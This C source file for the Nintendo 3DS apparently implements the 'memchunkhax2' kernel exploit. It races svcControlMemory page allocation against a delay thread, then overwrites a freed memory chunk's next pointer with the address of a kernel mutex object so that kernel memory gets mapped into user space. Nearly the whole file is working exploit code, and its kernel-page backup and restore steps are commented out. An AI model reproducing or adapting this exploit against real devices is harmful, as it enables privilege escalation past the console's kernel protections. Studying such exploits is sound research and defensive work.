#include "memchunkhax2.h"

#include <3ds.h>

#include <stdio.h>
#include <stdlib.h>

#define PAGE_SIZE 0x1000

typedef struct {
    u32 size;
    void* next;
    void* prev;
} MemChunkHdr;

typedef struct {
    u32 addr;
    u32 size;
    Result result;
} AllocateData;

extern u32 __ctru_heap;
extern u32 __ctru_heap_size;

// Thread function to slow down svcControlMemory execution.
static void delay_thread(void* arg) {
    AllocateData* data = (AllocateData*) arg;

    // Slow down thread execution until the control operation has completed.
    while(data->result == -1) {
        svcSleepThread(10000);
    }
}

// Thread function to allocate memory pages.
static void allocate_thread(void* arg) {
    AllocateData* data = (AllocateData*) arg;

    // Allocate the requested pages.
    data->result = svcControlMemory(&data->addr, data->addr, 0, data->size, MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE));
}

// Executes exploit.
void execute_memchunkhax2() {
    printf("Setting up...\n");

    // Set up variables.
    Handle arbiter = __sync_get_arbiter();
    AllocateData* data = (AllocateData*) malloc(sizeof(AllocateData));
    void* backup = malloc(PAGE_SIZE);
    u32 isolatedPage = 0;
    u32 isolatingPage = 0;
    Handle kObjHandle = 0;
    u32 kObjAddr = 0;
    Thread delayThread = NULL;

    if(data == NULL) {
        printf("Failed to create allocate data.\n");
        goto cleanup;
    }

    if(backup == NULL) {
        printf("Failed to create kernel page backup buffer.\n");
        goto cleanup;
    }

    data->addr = __ctru_heap + __ctru_heap_size;
    data->size = PAGE_SIZE * 2;
    data->result = -1;

    aptOpenSession();
    if(R_FAILED(APT_SetAppCpuTimeLimit(30))) {
        printf("Failed to allow threads on core 1.\n");
        goto cleanup;
    }

    aptCloseSession();

    // Isolate a single page between others to ensure using the next pointer.
    if(R_FAILED(svcControlMemory(&isolatedPage, data->addr + data->size, 0, PAGE_SIZE, MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE)))) {
        printf("Failed to allocate isolated page.\n");
        goto cleanup;
    }

    if(R_FAILED(svcControlMemory(&isolatingPage, isolatedPage + PAGE_SIZE, 0, PAGE_SIZE, MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE)))) {
        printf("Failed to allocate isolating page.\n");
        goto cleanup;
    }

    if(R_FAILED(svcControlMemory(&isolatedPage, isolatedPage, 0, PAGE_SIZE, MEMOP_FREE, MEMPERM_DONTCARE))) {
        printf("Failed to free isolated page.\n");
        goto cleanup;
    }

    isolatedPage = 0;

    // Create a KSynchronizationObject in order to use part of its data as a fake memory block header.
    // Within the KSynchronizationObject, refCount = size, syncedThreads = next, firstThreadNode = prev.
    // Prev does not matter, as any verification happens prior to the overwrite.
    // However, next must be 0, as it does not use size to check when allocation is finished.
    // If next is not 0, it will continue to whatever is pointed to by it.
    // Even if this eventually reaches an end, it will continue decrementing the remaining size value.
    // This will roll over, and panic when it thinks that there is more memory to allocate than was available.
    if(R_FAILED(svcCreateMutex(&kObjHandle, 0))) {
        printf("Failed to create KSynchronizationObject.\n");
        goto cleanup;
    }

    // Pull the kernel address of the created object from r2.
    asm("mov %0, r2" : "=r"(kObjAddr));

    printf("Mapping pages for overwrite...\n");

    // Create thread to slow down svcControlMemory execution.
    delayThread = threadCreate(delay_thread, data, 0x4000, 0x18, 1, true);
    if(delayThread == NULL) {
        printf("Failed to create delay thread.\n");
        goto cleanup;
    }

    // Create thread to allocate pages.
    if(threadCreate(allocate_thread, data, 0x4000, 0x3F, 1, true) == NULL) {
        printf("Failed to create allocation thread.\n");
        goto cleanup;
    }

    // Use svcArbitrateAddress to detect when the first memory page has been mapped.
    while((u32) svcArbitrateAddress(arbiter, data->addr, ARBITRATION_WAIT_IF_LESS_THAN_TIMEOUT, 0, 0) == 0xD9001814);

    // Overwrite the header "next" pointer to our crafted MemChunkHdr within our kernel object.
    ((MemChunkHdr*) data->addr)->next = (MemChunkHdr*) kObjAddr;

    // Use svcArbitrateAddress to detect when the kernel memory page has been mapped.
    while((u32) svcArbitrateAddress(arbiter, data->addr + PAGE_SIZE, ARBITRATION_WAIT_IF_LESS_THAN_TIMEOUT, 0, 0) == 0xD9001814);

    // Back up the kernel page before it is cleared.
    //memcpy(backup, (void*) (memAddr + PAGE_SIZE), PAGE_SIZE);

    printf("Overwrite complete.\n");

    if(data->result != -1) {
        printf("Failed to perform overwrite on time.\n");
        goto cleanup;
    }

    // Wait for memory mapping to complete.
    while(data->result == -1) {
        svcSleepThread(1000000);
    }

    // Restore the kernel page backup.
    //memcpy((void*) (memAddr + PAGE_SIZE), backup, PAGE_SIZE);

    if(R_FAILED(data->result)) {
        printf("Failed to map memory.\n");
        goto cleanup;
    }

    cleanup:
    printf("Cleaning up...\n");

    if(data != NULL && data->result == 0) {
        svcControlMemory(&data->addr, data->addr, 0, data->size, MEMOP_FREE, MEMPERM_DONTCARE);
    }

    if(delayThread != NULL && data != NULL && data->result == -1) {
        // Set the result to 0 to terminate the delay thread.
        data->result = 0;
    }

    if(isolatedPage != 0) {
        svcControlMemory(&isolatedPage, isolatedPage, 0, PAGE_SIZE, MEMOP_FREE, MEMPERM_DONTCARE);
        isolatedPage = 0;
    }

    if(isolatingPage != 0) {
        svcControlMemory(&isolatingPage, isolatingPage, 0, PAGE_SIZE, MEMOP_FREE, MEMPERM_DONTCARE);
        isolatingPage = 0;
    }

    if(backup != NULL) {
        free(backup);
    }

    if(data != NULL) {
        free(data);
    }

    if(kObjHandle != 0) {
        svcCloseHandle(kObjHandle);
    }
}